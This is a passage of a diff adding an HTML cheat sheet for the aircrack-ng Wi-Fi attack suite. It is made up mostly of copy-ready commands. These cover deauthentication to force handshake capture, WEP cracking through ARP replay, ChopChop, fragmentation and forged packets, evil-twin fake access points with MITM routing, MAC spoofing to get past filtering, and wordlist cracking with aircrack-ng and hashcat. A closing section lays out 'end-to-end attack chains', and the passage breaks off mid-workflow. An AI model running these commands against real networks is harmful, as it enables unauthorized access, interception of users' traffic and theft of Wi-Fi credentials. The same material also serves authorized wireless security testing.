+            <code><span class="comment"># Standard ARP replay</span>
+aireplay-ng -3 -b AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0mon
+
+<span class="comment"># With saved ARP packet</span>
+aireplay-ng -3 -b AA:BB:CC:DD:EE:FF -r arp_packet.cap wlan0mon</code>
+          </div>
+        </div>
+      </div>
+
+      <div class="cmd-card">
+        <div class="cmd-header" onclick="toggleCard(this)">
+          <span class="cmd-name">Attack 4 — KoreK ChopChop</span>
+          <span class="cmd-brief">Decrypt WEP packet without key</span>
+          <span class="cmd-toggle">+</span>
+        </div>
+        <div class="cmd-body">
+          <div class="cmd-desc">Decrypts a WEP packet byte-by-byte. Slow but doesn't require key. Produces .xor PRGA file usable with packetforge-ng.</div>
+          <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+            <code>aireplay-ng -4 -b AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0mon</code>
+          </div>
+        </div>
+      </div>
+
+      <div class="cmd-card">
+        <div class="cmd-header" onclick="toggleCard(this)">
+          <span class="cmd-name">Attack 5 — Fragmentation</span>
+          <span class="cmd-brief">Obtain PRGA keystream via fragmentation</span>
+          <span class="cmd-toggle">+</span>
+        </div>
+        <div class="cmd-body">
+          <div class="cmd-desc">Obtains 1500 bytes of PRGA keystream. Faster than ChopChop. Output .xor file used to forge packets.</div>
+          <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+            <code>aireplay-ng -5 -b AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0mon</code>
+          </div>
+        </div>
+      </div>
+
+      <div class="cmd-card">
+        <div class="cmd-header" onclick="toggleCard(this)">
+          <span class="cmd-name">Attack 6 — Café-Latte</span>
+          <span class="cmd-brief">Recover WEP key from isolated client</span>
+          <span class="cmd-toggle">+</span>
+        </div>
+        <div class="cmd-body">
+          <div class="cmd-desc">Attacks a WEP client without AP present. Flips bits in ARP packet to elicit replies from client. Works on mobile/isolated devices.</div>
+          <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+            <code>aireplay-ng -6 -b AA:BB:CC:DD:EE:FF -h CLIENT_MAC -D wlan0mon</code>
+          </div>
+        </div>
+      </div>
+
+      <div class="cmd-card">
+        <div class="cmd-header" onclick="toggleCard(this)">
+          <span class="cmd-name">Attack 9 — Injection Test</span>
+          <span class="cmd-brief">Verify adapter supports packet injection</span>
+          <span class="cmd-toggle">+</span>
+        </div>
+        <div class="cmd-body">
+          <div class="cmd-desc">Tests adapter injection capability and measures quality/speed. Run before any attack to confirm setup.</div>
+          <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+            <code><span class="comment"># Basic test (broadcasts)</span>
+aireplay-ng -9 wlan0mon
+
+<span class="comment"># Test against specific AP</span>
+aireplay-ng -9 -e "NetworkName" -a AA:BB:CC:DD:EE:FF wlan0mon</code>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- AIRMON-NG -->
+    <div class="section" id="section-airmon">
+      <div class="section-title">airmon-ng</div>
+      <div class="section-sub">MONITOR MODE MANAGEMENT</div>
+
+      <div class="cmd-card">
+        <div class="cmd-header" onclick="toggleCard(this)">
+          <span class="cmd-name">List Interfaces</span>
+          <span class="cmd-brief">Show all wireless adapters</span>
+          <span class="cmd-toggle">+</span>
+        </div>
+        <div class="cmd-body">
+          <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+            <code><span class="comment"># List all wireless interfaces + chipset info</span>
+airmon-ng</code>
+          </div>
+        </div>
+      </div>
+
+      <div class="cmd-card">
+        <div class="cmd-header" onclick="toggleCard(this)">
+          <span class="cmd-name">Enable Monitor Mode</span>
+          <span class="cmd-brief">Put adapter into monitor mode</span>
+          <span class="cmd-toggle">+</span>
+        </div>
+        <div class="cmd-body">
+          <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+            <code><span class="comment"># Enable monitor mode</span>
+airmon-ng start wlan0
+
+<span class="comment"># Enable on specific channel</span>
+airmon-ng start wlan0 6
+
+<span class="comment"># Kill interfering processes first</span>
+airmon-ng check kill
+airmon-ng start wlan0</code>
+          </div>
+          <div class="tip-box warn">
+            <strong>⚠ Interface Rename</strong>
+            wlan0 becomes wlan0mon after enabling monitor mode. Use new name in subsequent commands.
+          </div>
+        </div>
+      </div>
+
+      <div class="cmd-card">
+        <div class="cmd-header" onclick="toggleCard(this)">
+          <span class="cmd-name">Disable Monitor Mode</span>
+          <span class="cmd-brief">Restore adapter to managed mode</span>
+          <span class="cmd-toggle">+</span>
+        </div>
+        <div class="cmd-body">
+          <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+            <code><span class="comment"># Stop monitor mode</span>
+airmon-ng stop wlan0mon
+
+<span class="comment"># Restart NetworkManager after</span>
+service NetworkManager restart</code>
+          </div>
+        </div>
+      </div>
+
+      <div class="cmd-card">
+        <div class="cmd-header" onclick="toggleCard(this)">
+          <span class="cmd-name">Check Interfering Processes</span>
+          <span class="cmd-brief">Find processes that disrupt monitor mode</span>
+          <span class="cmd-toggle">+</span>
+        </div>
+        <div class="cmd-body">
+          <div class="cmd-desc">NetworkManager, wpa_supplicant, dhclient interfere with monitor mode. Check and kill them.</div>
+          <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+            <code><span class="comment"># Check for interfering processes</span>
+airmon-ng check
+
+<span class="comment"># Kill all interfering processes</span>
+airmon-ng check kill</code>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- AIRDECAP-NG -->
+    <div class="section" id="section-airdecap">
+      <div class="section-title">airdecap-ng</div>
+      <div class="section-sub">DECRYPT CAPTURED PACKETS</div>
+
+      <div class="cmd-card">
+        <div class="cmd-header" onclick="toggleCard(this)">
+          <span class="cmd-name">Decrypt WEP</span>
+          <span class="cmd-brief">Decrypt WEP-encrypted capture with known key</span>
+          <span class="cmd-toggle">+</span>
+        </div>
+        <div class="cmd-body">
+          <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+            <code><span class="comment"># Hex WEP key</span>
+airdecap-ng -w 1234567890ABCDEF1234567890 capture.cap
+
+<span class="comment"># ASCII WEP key</span>
+airdecap-ng -w password123 capture.cap</code>
+          </div>
+          <table class="flag-table">
+            <tr><th>Flag</th><th>Description</th></tr>
+            <tr><td class="flag">-w &lt;key&gt;</td><td class="flag-desc">WEP key in hex or ASCII</td></tr>
+            <tr><td class="flag">-b &lt;bssid&gt;</td><td class="flag-desc">AP BSSID to filter</td></tr>
+            <tr><td class="flag">-e &lt;essid&gt;</td><td class="flag-desc">AP ESSID for WPA decryption</td></tr>
+            <tr><td class="flag">-l</td><td class="flag-desc">Skip LLC header removal</td></tr>
+          </table>
+        </div>
+      </div>
+
+      <div class="cmd-card">
+        <div class="cmd-header" onclick="toggleCard(this)">
+          <span class="cmd-name">Decrypt WPA/WPA2</span>
+          <span class="cmd-brief">Decrypt WPA capture with known passphrase</span>
+          <span class="cmd-toggle">+</span>
+        </div>
+        <div class="cmd-body">
+          <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+            <code><span class="comment"># Decrypt WPA with passphrase</span>
+airdecap-ng -e "NetworkSSID" -p "MyPassword" capture.cap
+
+<span class="comment"># Output goes to capture-dec.cap</span></code>
+          </div>
+          <div class="tip-box info">
+            <strong>ℹ Output</strong>
+            Decrypted file saved as [input]-dec.cap in same directory.
+          </div>
+        </div>
+      </div>
+
+      <div class="cmd-card">
+        <div class="cmd-header" onclick="toggleCard(this)">
+          <span class="cmd-name">Strip Headers (Open Network)</span>
+          <span class="cmd-brief">Remove 802.11 headers from unencrypted capture</span>
+          <span class="cmd-toggle">+</span>
+        </div>
+        <div class="cmd-body">
+          <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+            <code>airdecap-ng -b AA:BB:CC:DD:EE:FF capture.cap</code>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- AIRTUN-NG -->
+    <div class="section" id="section-airtun">
+      <div class="section-title">airtun-ng</div>
+      <div class="section-sub">VIRTUAL TUNNEL INTERFACE</div>
+
+      <div class="cmd-card">
+        <div class="cmd-header" onclick="toggleCard(this)">
+          <span class="cmd-name">Create Tunnel (WEP)</span>
+          <span class="cmd-brief">Decrypt WEP traffic in real-time via tun interface</span>
+          <span class="cmd-toggle">+</span>
+        </div>
+        <div class="cmd-body">
+          <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+            <code><span class="comment"># Create tunnel with WEP key</span>
+airtun-ng -a AA:BB:CC:DD:EE:FF -w 1234567890ABCDEF1234567890 wlan0mon
+
+<span class="comment"># Bring up tunnel interface</span>
+ifconfig at0 up
+
+<span class="comment"># Run Wireshark on at0 to see decrypted traffic</span>
+wireshark -i at0</code>
+          </div>
+          <table class="flag-table">
+            <tr><th>Flag</th><th>Description</th></tr>
+            <tr><td class="flag">-a &lt;bssid&gt;</td><td class="flag-desc">AP MAC address</td></tr>
+            <tr><td class="flag">-w &lt;key&gt;</td><td class="flag-desc">WEP key</td></tr>
+            <tr><td class="flag">-p &lt;pass&gt;</td><td class="flag-desc">WPA passphrase</td></tr>
+            <tr><td class="flag">-e &lt;essid&gt;</td><td class="flag-desc">ESSID for WPA</td></tr>
+            <tr><td class="flag">-t &lt;tods&gt;</td><td class="flag-desc">Only pass To-DS packets (0 or 1)</td></tr>
+          </table>
+        </div>
+      </div>
+    </div>
+
+    <!-- PACKETFORGE-NG -->
+    <div class="section" id="section-packetforge">
+      <div class="section-title">packetforge-ng</div>
+      <div class="section-sub">FORGE ENCRYPTED INJECTION PACKETS</div>
+
+      <div class="cmd-card">
+        <div class="cmd-header" onclick="toggleCard(this)">
+          <span class="cmd-name">Forge ARP Packet</span>
+          <span class="cmd-brief">Create injectable ARP for WEP IV generation</span>
+          <span class="cmd-toggle">+</span>
+        </div>
+        <div class="cmd-body">
+          <div class="cmd-desc">Creates a forged ARP packet encrypted with PRGA from fragmentation or ChopChop attack. Used with aireplay-ng -2.</div>
+          <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+            <code><span class="comment"># Forge ARP using PRGA keystream file</span>
+packetforge-ng -0 -a AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 \
+  -k 255.255.255.255 -l 255.255.255.255 \
+  -y fragment.xor -w forged_arp.cap
+
+<span class="comment"># Inject forged packet</span>
+aireplay-ng -2 -r forged_arp.cap wlan0mon</code>
+          </div>
+          <table class="flag-table">
+            <tr><th>Flag</th><th>Description</th></tr>
+            <tr><td class="flag">-0</td><td class="flag-desc">Forge ARP packet</td></tr>
+            <tr><td class="flag">-1</td><td class="flag-desc">Forge UDP packet</td></tr>
+            <tr><td class="flag">-2</td><td class="flag-desc">Forge ICMP packet</td></tr>
+            <tr><td class="flag">-3</td><td class="flag-desc">Forge custom packet</td></tr>
+            <tr><td class="flag">-a &lt;bssid&gt;</td><td class="flag-desc">AP MAC address</td></tr>
+            <tr><td class="flag">-h &lt;mac&gt;</td><td class="flag-desc">Source MAC</td></tr>
+            <tr><td class="flag">-k &lt;ip&gt;</td><td class="flag-desc">Destination IP</td></tr>
+            <tr><td class="flag">-l &lt;ip&gt;</td><td class="flag-desc">Source IP</td></tr>
+            <tr><td class="flag">-y &lt;xor&gt;</td><td class="flag-desc">PRGA keystream file (.xor)</td></tr>
+            <tr><td class="flag">-w &lt;file&gt;</td><td class="flag-desc">Output packet file</td></tr>
+          </table>
+        </div>
+      </div>
+    </div>
+
+    <!-- AIRBASE-NG -->
+    <div class="section" id="section-airbase">
+      <div class="section-title">airbase-ng</div>
+      <div class="section-sub">FAKE ACCESS POINT // CLIENT ATTACKS</div>
+
+      <div class="cmd-card">
+        <div class="cmd-header" onclick="toggleCard(this)">
+          <span class="cmd-name">Basic Fake AP</span>
+          <span class="cmd-brief">Create honeypot access point</span>
+          <span class="cmd-toggle">+</span>
+        </div>
+        <div class="cmd-body">
+          <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+            <code><span class="comment"># Open fake AP</span>
+airbase-ng -e "FreeWiFi" -c 6 wlan0mon
+
+<span class="comment"># Fake WPA2 AP (capture handshakes)</span>
+airbase-ng -e "FreeWiFi" -c 6 -z 4 wlan0mon
+
+<span class="comment"># Evil twin (clone existing AP)</span>
+airbase-ng -e "TargetSSID" -a AA:BB:CC:DD:EE:FF -c 6 wlan0mon</code>
+          </div>
+          <table class="flag-table">
+            <tr><th>Flag</th><th>Description</th></tr>
+            <tr><td class="flag">-e &lt;ssid&gt;</td><td class="flag-desc">SSID name for fake AP</td></tr>
+            <tr><td class="flag">-c &lt;chan&gt;</td><td class="flag-desc">Channel to broadcast on</td></tr>
+            <tr><td class="flag">-a &lt;bssid&gt;</td><td class="flag-desc">Custom AP MAC to spoof</td></tr>
+            <tr><td class="flag">-z &lt;type&gt;</td><td class="flag-desc">WPA cipher: 1=WEP, 2=TKIP, 3=WRAP, 4=CCMP, 5=WEP104</td></tr>
+            <tr><td class="flag">-Z &lt;type&gt;</td><td class="flag-desc">WPA2 cipher types (same values as -z)</td></tr>
+            <tr><td class="flag">-A</td><td class="flag-desc">Ad-Hoc mode</td></tr>
+            <tr><td class="flag">-F &lt;prefix&gt;</td><td class="flag-desc">Write pcap to file</td></tr>
+            <tr><td class="flag">-P</td><td class="flag-desc">Respond to all probe requests</td></tr>
+            <tr><td class="flag">-v</td><td class="flag-desc">Verbose output</td></tr>
+          </table>
+          <div class="tip-box warn">
+            <strong>⚠ Setup After</strong>
+            After airbase-ng starts, configure at0 interface with IP and run DHCP server (dnsmasq) to route client traffic.
+          </div>
+        </div>
+      </div>
+
+      <div class="cmd-card">
+        <div class="cmd-header" onclick="toggleCard(this)">
+          <span class="cmd-name">MITM Setup</span>
+          <span class="cmd-brief">Route fake AP traffic for interception</span>
+          <span class="cmd-toggle">+</span>
+        </div>
+        <div class="cmd-body">
+          <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+            <code><span class="comment"># After airbase-ng is running on at0</span>
+ifconfig at0 up 10.0.0.1 netmask 255.255.255.0
+
+<span class="comment"># Enable IP forwarding</span>
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+<span class="comment"># NAT traffic out eth0</span>
+iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
+iptables -A FORWARD -i at0 -o eth0 -j ACCEPT
+
+<span class="comment"># Run dnsmasq for DHCP</span>
+dnsmasq --interface=at0 --dhcp-range=10.0.0.2,10.0.0.100,12h</code>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- AIRDECLOAK -->
+    <div class="section" id="section-airdecloak">
+      <div class="section-title">airdecloak-ng</div>
+      <div class="section-sub">REMOVE WEP CLOAKING FROM PCAP FILES</div>
+
+      <div class="cmd-card">
+        <div class="cmd-header" onclick="toggleCard(this)">
+          <span class="cmd-name">Remove Cloaking</span>
+          <span class="cmd-brief">Strip fake packets injected by WEP cloaking</span>
+          <span class="cmd-toggle">+</span>
+        </div>
+        <div class="cmd-body">
+          <div class="cmd-desc">Removes injected cloaking packets that some APs use to frustrate WEP cracking. Outputs clean .pcap for aircrack-ng.</div>
+          <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+            <code>airdecloak-ng --bssid AA:BB:CC:DD:EE:FF --filters signal --input capture.cap</code>
+          </div>
+          <table class="flag-table">
+            <tr><th>Flag</th><th>Description</th></tr>
+            <tr><td class="flag">--bssid</td><td class="flag-desc">Target AP MAC</td></tr>
+            <tr><td class="flag">--input</td><td class="flag-desc">Input pcap file</td></tr>
+            <tr><td class="flag">--filters</td><td class="flag-desc">Filters: signal, duplicate_sn, duplicate_sn_ap, duplicate_sn_sta, all</td></tr>
+            <tr><td class="flag">--output-clean</td><td class="flag-desc">Output file for real packets (default: clean.ivs)</td></tr>
+            <tr><td class="flag">--output-cloaked</td><td class="flag-desc">Output file for cloaked packets</td></tr>
+          </table>
+        </div>
+      </div>
+    </div>
+
+    <!-- WESSIDE-NG -->
+    <div class="section" id="section-wesside">
+      <div class="section-title">wesside-ng</div>
+      <div class="section-sub">AUTO WEP KEY CRACKING</div>
+
+      <div class="cmd-card">
+        <div class="cmd-header" onclick="toggleCard(this)">
+          <span class="cmd-name">Auto WEP Crack</span>
+          <span class="cmd-brief">Fully automated WEP attack tool</span>
+          <span class="cmd-toggle">+</span>
+        </div>
+        <div class="cmd-body">
+          <div class="cmd-desc">Automated tool combining all WEP attacks. Finds nearby WEP network, injects, captures IVs, and cracks automatically.</div>
+          <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+            <code><span class="comment"># Auto attack all nearby WEP networks</span>
+wesside-ng -i wlan0mon
+
+<span class="comment"># Target specific network</span>
+wesside-ng -i wlan0mon -a AA:BB:CC:DD:EE:FF
+
+<span class="comment"># Specify source MAC</span>
+wesside-ng -i wlan0mon -m 00:11:22:33:44:55</code>
+          </div>
+          <table class="flag-table">
+            <tr><th>Flag</th><th>Description</th></tr>
+            <tr><td class="flag">-i &lt;iface&gt;</td><td class="flag-desc">Monitor mode interface</td></tr>
+            <tr><td class="flag">-a &lt;bssid&gt;</td><td class="flag-desc">Target specific BSSID</td></tr>
+            <tr><td class="flag">-m &lt;mac&gt;</td><td class="flag-desc">Source MAC to use</td></tr>
+            <tr><td class="flag">-n &lt;net&gt;</td><td class="flag-desc">Network IP to avoid (own IP range)</td></tr>
+            <tr><td class="flag">-v &lt;victim&gt;</td><td class="flag-desc">Victim IP for ARP injection</td></tr>
+          </table>
+        </div>
+      </div>
+    </div>
+
+    <!-- EASSIDE-NG -->
+    <div class="section" id="section-easside">
+      <div class="section-title">easside-ng</div>
+      <div class="section-sub">COMMUNICATE TO AP WITHOUT WEP KEY</div>
+
+      <div class="cmd-card">
+        <div class="cmd-header" onclick="toggleCard(this)">
+          <span class="cmd-name">Easside Attack</span>
+          <span class="cmd-brief">Communicate on WEP network without key</span>
+          <span class="cmd-toggle">+</span>
+        </div>
+        <div class="cmd-body">
+          <div class="cmd-desc">Advanced tool allowing internet access on WEP network without knowing key. Requires buddy-ng server on external machine.</div>
+          <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+            <code><span class="comment"># Start buddy-ng on external server first</span>
+buddy-ng external.server.ip
+
+<span class="comment"># Run easside-ng</span>
+easside-ng -i wlan0mon -a AA:BB:CC:DD:EE:FF -s external.server.ip</code>
+          </div>
+          <table class="flag-table">
+            <tr><th>Flag</th><th>Description</th></tr>
+            <tr><td class="flag">-i &lt;iface&gt;</td><td class="flag-desc">Monitor mode interface</td></tr>
+            <tr><td class="flag">-a &lt;bssid&gt;</td><td class="flag-desc">Target AP MAC</td></tr>
+            <tr><td class="flag">-c &lt;channel&gt;</td><td class="flag-desc">AP channel</td></tr>
+            <tr><td class="flag">-s &lt;server&gt;</td><td class="flag-desc">IP of buddy-ng server</td></tr>
+            <tr><td class="flag">-d &lt;net&gt;</td><td class="flag-desc">Destination network (e.g., 0.0.0.0)</td></tr>
+          </table>
+        </div>
+      </div>
+    </div>
+
+    <!-- BUDDY-NG -->
+    <div class="section" id="section-buddy">
+      <div class="section-title">buddy-ng</div>
+      <div class="section-sub">HELPER SERVER FOR EASSIDE-NG</div>
+
+      <div class="cmd-card">
+        <div class="cmd-header" onclick="toggleCard(this)">
+          <span class="cmd-name">Run Buddy Server</span>
+          <span class="cmd-brief">Start relay server for easside-ng</span>
+          <span class="cmd-toggle">+</span>
+        </div>
+        <div class="cmd-body">
+          <div class="cmd-desc">Runs on an external machine with internet access. Acts as relay for easside-ng to communicate through WEP network.</div>
+          <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+            <code><span class="comment"># Run on external internet-connected machine</span>
+buddy-ng
+
+<span class="comment"># With verbose output</span>
+buddy-ng -v
+
+<span class="comment"># Specific port</span>
+buddy-ng -p 8080</code>
+          </div>
+          <table class="flag-table">
+            <tr><th>Flag</th><th>Description</th></tr>
+            <tr><td class="flag">-p &lt;port&gt;</td><td class="flag-desc">Listening port (default 8080)</td></tr>
+            <tr><td class="flag">-v</td><td class="flag-desc">Verbose output</td></tr>
+          </table>
+        </div>
+      </div>
+    </div>
+
+    <!-- TROUBLESHOOTING -->
+    <div class="section" id="section-troubleshoot">
+      <div class="section-title">Troubleshooting</div>
+      <div class="section-sub">COMMON ISSUES & FIXES</div>
+
+      <div class="trouble-item">
+        <div class="trouble-q" onclick="toggleTrouble(this)">
+          Monitor mode fails to enable / reverts to managed
+          <span class="trouble-toggle">+</span>
+        </div>
+        <div class="trouble-a">
+          <ol class="steps">
+            <li>Kill all interfering processes: <code>airmon-ng check kill</code></li>
+            <li>Verify NetworkManager stopped: <code>systemctl stop NetworkManager</code></li>
+            <li>Enable monitor mode: <code>airmon-ng start wlan0</code></li>
+            <li>Confirm mode: <code>iwconfig wlan0mon</code> — should show Mode:Monitor</li>
+            <li>If still failing, use manual method:<br>
+              <code>ip link set wlan0 down</code><br>
+              <code>iw dev wlan0 set type monitor</code><br>
+              <code>ip link set wlan0 up</code>
+            </li>
+          </ol>
+        </div>
+      </div>
+
+      <div class="trouble-item">
+        <div class="trouble-q" onclick="toggleTrouble(this)">
+          Injection test fails / 0% injection rate
+          <span class="trouble-toggle">+</span>
+        </div>
+        <div class="trouble-a">
+          <ol class="steps">
+            <li>Confirm monitor mode is active: <code>iwconfig</code></li>
+            <li>Check chipset supports injection (not all do — Atheros, Ralink, Realtek RTL8812 recommended)</li>
+            <li>Move closer to target AP — weak signal = failed injection</li>
+            <li>Lock to correct channel: <code>iwconfig wlan0mon channel 6</code></li>
+            <li>Try different driver or update firmware</li>
+            <li>Test again: <code>aireplay-ng -9 wlan0mon</code></li>
+          </ol>
+          <div class="tip-box info">
+            <strong>ℹ Recommended Chipsets</strong>
+            Alfa AWUS036ACH (RTL8812AU), Alfa AWUS036NH (RT3070), TP-Link TL-WN722N v1 (AR9271).
+          </div>
+        </div>
+      </div>
+
+      <div class="trouble-item">
+        <div class="trouble-q" onclick="toggleTrouble(this)">
+          No handshake captured in airodump-ng
+          <span class="trouble-toggle">+</span>
+        </div>
+        <div class="trouble-a">
+          <ol class="steps">
+            <li>Confirm clients are connected to the AP (visible in STATION column)</li>
+            <li>Send deauth to force reconnect: <code>aireplay-ng -0 5 -a [BSSID] wlan0mon</code></li>
+            <li>Check top-right of airodump — should say "WPA handshake: [BSSID]"</li>
+            <li>Wait for natural reconnect — some clients take 30-60s</li>
+            <li>Ensure locked to correct channel — channel hopping = missed handshake</li>
+            <li>Verify capture file isn't corrupt: <code>aircrack-ng capture-01.cap</code></li>
+          </ol>
+          <div class="tip-box warn">
+            <strong>⚠ Note</strong>
+            Must be on correct channel (-c flag in airodump-ng) before deauth or handshake will not be captured.
+          </div>
+        </div>
+      </div>
+
+      <div class="trouble-item">
+        <div class="trouble-q" onclick="toggleTrouble(this)">
+          aircrack-ng shows "Passphrase not in dictionary"
+          <span class="trouble-toggle">+</span>
+        </div>
+        <div class="trouble-a">
+          <ol class="steps">
+            <li>Try larger wordlist — rockyou.txt is 14M entries, try SecLists or hashcat wordlists</li>
+            <li>Use rule-based mutation with hashcat: <code>hashcat -m 22000 hash.hc22000 rockyou.txt -r rules/best64.rule</code></li>
+            <li>Generate custom wordlist with crunch or cewl (target's website)</li>
+            <li>Try PRINCE or Markov chain attacks for longer passphrases</li>
+            <li>Confirm handshake is valid — not a PMKID or partial handshake</li>
+          </ol>
+          <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+            <code><span class="comment"># Convert cap to hashcat format</span>
+hcxpcapngtool -o hash.hc22000 capture-01.cap
+
+<span class="comment"># Crack with rules</span>
+hashcat -m 22000 hash.hc22000 rockyou.txt -r /usr/share/hashcat/rules/best64.rule</code>
+          </div>
+        </div>
+      </div>
+
+      <div class="trouble-item">
+        <div class="trouble-q" onclick="toggleTrouble(this)">
+          WEP cracking stuck — not enough IVs
+          <span class="trouble-toggle">+</span>
+        </div>
+        <div class="trouble-a">
+          <ol class="steps">
+            <li>Fake-auth first: <code>aireplay-ng -1 0 -a [BSSID] wlan0mon</code></li>
+            <li>Start ARP replay: <code>aireplay-ng -3 -b [BSSID] -h [YOUR_MAC] wlan0mon</code></li>
+            <li>Watch IVs count in airodump — need 20,000+ for 64-bit, 40,000+ for 128-bit</li>
+            <li>If no ARP, use fragmentation/chopchop + packetforge to create injectable ARP</li>
+            <li>Check airodump shows data incrementing — if not, injection isn't working</li>
+          </ol>
+        </div>
+      </div>
+
+      <div class="trouble-item">
+        <div class="trouble-q" onclick="toggleTrouble(this)">
+          "Fixed channel" error in aireplay-ng
+          <span class="trouble-toggle">+</span>
+        </div>
+        <div class="trouble-a">
+          <ol class="steps">
+            <li>Airodump-ng is hopping channels, conflicting with aireplay</li>
+            <li>Lock airodump to specific channel: add <code>-c [channel]</code> to airodump command</li>
+            <li>Or set channel manually: <code>iwconfig wlan0mon channel 6</code></li>
+            <li>Run airodump first with channel lock, then aireplay in second terminal</li>
+          </ol>
+        </div>
+      </div>
+
+      <div class="trouble-item">
+        <div class="trouble-q" onclick="toggleTrouble(this)">
+          Fake auth returns "Got a deauthentication packet!"
+          <span class="trouble-toggle">+</span>
+        </div>
+        <div class="trouble-a">
+          <ol class="steps">
+            <li>AP uses MAC filtering — whitelist your MAC first</li>
+            <li>Spoof MAC of already-associated client: <code>-h [CLIENT_MAC]</code></li>
+            <li>Capture client's MAC from airodump STATION column</li>
+            <li>AP may use Shared Key Auth — try with SKA xor file if you have one</li>
+            <li>Try increasing re-associate interval: <code>aireplay-ng -1 6000 ...</code></li>
+          </ol>
+        </div>
+      </div>
+
+      <div class="trouble-item">
+        <div class="trouble-q" onclick="toggleTrouble(this)">
+          Adapter not found / interface missing after monitor mode
+          <span class="trouble-toggle">+</span>
+        </div>
+        <div class="trouble-a">
+          <ol class="steps">
+            <li>List all interfaces including down: <code>ip a</code> or <code>ifconfig -a</code></li>
+            <li>Check dmesg for driver errors: <code>dmesg | grep -i wlan</code></li>
+            <li>Stop monitor, re-enable: <code>airmon-ng stop wlan0mon && airmon-ng start wlan0</code></li>
+            <li>Check if USB adapter disconnected/replugged: <code>lsusb</code></li>
+            <li>Reinstall driver or use dkms module for Alfa adapters</li>
+          </ol>
+        </div>
+      </div>
+
+      <div class="trouble-item">
+        <div class="trouble-q" onclick="toggleTrouble(this)">
+          "Received X packets, got 0 ARP requests" in attack 3
+          <span class="trouble-toggle">+</span>
+        </div>
+        <div class="trouble-a">
+          <ol class="steps">
+            <li>No existing ARP traffic to replay — generate some first</li>
+            <li>Use fragmentation attack to get PRGA: <code>aireplay-ng -5 ...</code></li>
+            <li>Forge ARP with packetforge-ng using the .xor file</li>
+            <li>Inject forged ARP: <code>aireplay-ng -2 -r forged_arp.cap wlan0mon</code></li>
+            <li>Or use interactive replay (attack -2) to replay any captured packet</li>
+          </ol>
+        </div>
+      </div>
+    </div>
+
+    <!-- WORKFLOWS -->
+    <div class="section" id="section-workflows">
+      <div class="section-title">Workflows</div>
+      <div class="section-sub">END-TO-END ATTACK CHAINS</div>
+
+      <div class="cmd-card">
+        <div class="cmd-header" onclick="toggleCard(this)">
+          <span class="cmd-name">WPA2 Handshake Capture & Crack</span>
+          <span class="cmd-brief">Full workflow from setup to key recovery</span>
+          <span class="cmd-toggle">+</span>
+        </div>
+        <div class="cmd-body">
+          <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+            <code><span class="comment">## STEP 1: Kill interfering processes</span>
+airmon-ng check kill
+
+<span class="comment">## STEP 2: Enable monitor mode</span>
+airmon-ng start wlan0
+
+<span class="comment">## STEP 3: Scan for targets</span>
+airodump-ng wlan0mon
+<span class="comment"># Note BSSID and CH of target</span>
+
+<span class="comment">## STEP 4: Capture on target channel</span>
+airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wpa_capture wlan0mon
+
+<span class="comment">## STEP 5: Force handshake (new terminal)</span>
+aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon
+<span class="comment"># Watch airodump for "WPA handshake: AA:BB:CC:DD:EE:FF"</span>
+
+<span class="comment">## STEP 6: Crack with wordlist</span>
+aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF wpa_capture-01.cap</code>
+          </div>
+        </div>
+      </div>
+
+      <div class="cmd-card">
+        <div class="cmd-header" onclick="toggleCard(this)">
+          <span class="cmd-name">WEP Crack — ARP Replay</span>
+          <span class="cmd-brief">Full WEP key recovery via ARP injection</span>
+          <span class="cmd-toggle">+</span>
+        </div>
+        <div class="cmd-body">
+          <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+            <code><span class="comment">## STEP 1: Setup monitor mode</span>
+airmon-ng check kill
+airmon-ng start wlan0
+
+<span class="comment">## STEP 2: Find WEP network</span>
+airodump-ng wlan0mon
+<span class="comment"># Look for ENC: WEP in list</span>
+
+<span class="comment">## STEP 3: Capture IVs on target</span>
+airodump-ng -c 11 --bssid AA:BB:CC:DD:EE:FF -w wep_capture --output-format ivs wlan0mon
+
+<span class="comment">## STEP 4: Fake authenticate (new terminal)</span>
+aireplay-ng -1 0 -a AA:BB:CC:DD:EE:FF wlan0mon
+
+<span class="comment">## STEP 5: ARP replay injection</span>
+aireplay-ng -3 -b AA:BB:CC:DD:EE:FF wlan0mon
+<span class="comment"># Wait for IVs to build up (watch #Data in airodump)</span>
+
+<span class="comment">## STEP 6: Crack when enough IVs captured</span>
